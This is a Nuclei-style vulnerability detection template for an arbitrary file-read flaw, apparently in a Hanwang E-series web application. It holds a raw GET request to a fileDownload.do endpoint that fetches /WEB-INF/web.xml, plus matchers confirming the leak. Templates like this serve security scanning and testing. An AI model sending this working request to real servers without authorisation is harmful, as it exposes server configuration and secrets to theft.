id: hanwangE-fileDownload_do-File-reading

info:
  name: hanwangE-fileDownload_do-File-reading
  author: xxx
  severity: high
  tags: File reading

http:
  - raw:
      - |
        GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<?xml version='
          - '<web-app'
          - '</web-app>'
          - '<context-param>'
          - '</context-param>'
        condition: and
      - type: status
        status: 
          - 200